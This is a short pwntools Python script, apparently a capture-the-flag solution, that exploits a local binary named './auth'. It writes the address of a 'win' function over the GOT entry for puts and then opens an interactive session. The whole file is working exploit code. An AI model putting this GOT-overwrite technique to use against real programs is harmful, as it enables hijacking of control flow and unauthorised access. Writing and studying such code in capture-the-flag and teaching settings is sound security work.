from pwn import *
context.binary = "./auth"
p = process()
p.sendline(hex(context.binary.got["puts"]).encode("ascii"))
p.sendline(hex(context.binary.functions["win"].address).encode("ascii"))
p.interactive()
